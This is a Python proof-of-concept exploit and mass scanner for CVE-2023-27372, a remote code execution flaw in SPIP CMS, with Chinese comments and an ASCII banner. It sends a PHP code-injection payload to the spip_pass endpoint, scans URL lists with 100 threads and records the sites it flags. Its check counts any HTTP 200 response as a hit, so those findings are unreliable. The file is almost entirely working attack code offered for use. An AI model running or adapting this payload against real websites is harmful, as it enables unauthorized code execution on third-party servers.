#CVE-2023-27372 SPIP CMS远程代码执行漏洞
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ $$$$$$\  $$\    $$\ $$$$$$$$\       $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\          $$$$$$\  $$$$$$$$\  $$$$$$\  $$$$$$$$\  $$$$$$\  
$$  __$$\ $$ |   $$ |$$  _____|     $$  __$$\ $$$ __$$\ $$  __$$\ $$ ___$$\        $$  __$$\ \____$$  |$$ ___$$\ \____$$  |$$  __$$\ 
$$ /  \__|$$ |   $$ |$$ |           \__/  $$ |$$$$\ $$ |\__/  $$ |\_/   $$ |       \__/  $$ |    $$  / \_/   $$ |    $$  / \__/  $$ |
$$ |      \$$\  $$  |$$$$$\ $$$$$$\  $$$$$$  |$$\$$\$$ | $$$$$$  |  $$$$$ /$$$$$$\  $$$$$$  |   $$  /    $$$$$ /    $$  /   $$$$$$  |
$$ |       \$$\$$  / $$  __|\______|$$  ____/ $$ \$$$$ |$$  ____/   \___$$\\______|$$  ____/   $$  /     \___$$\   $$  /   $$  ____/ 
$$ |  $$\   \$$$  /  $$ |           $$ |      $$ |\$$$ |$$ |      $$\   $$ |       $$ |       $$  /    $$\   $$ | $$  /    $$ |      
\$$$$$$  |   \$  /   $$$$$$$$\      $$$$$$$$\ \$$$$$$  /$$$$$$$$\ \$$$$$$  |       $$$$$$$$\ $$  /     \$$$$$$  |$$  /     $$$$$$$$\ 
 \______/     \_/    \________|     \________| \______/ \________| \______/        \________|\__/       \______/ \__/      \________|
                                                                                                                                author :CHKer
                                                                                                                                version:1.0.0
  """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="CVE-2023-27372 SPIP CMS远程代码执行漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/spip/spip.php?page=spip_pass'
    headers = {
        'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        'Accept-Encoding':'gzip, deflate',
        'Accept': '*/*',
        'Connection':'close',
        'Cookie':'cibcInit=oui',
        'Content-Length': '215',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data ='page=spip_pass&formulaire_action=oubli&formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&oubli=s:19:"<?php phpinfo(); ?>";&nobot='
    
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,timeout=10,verify=False,proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在任意文件执行漏洞")
            with open('result11.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在任意文件执行漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()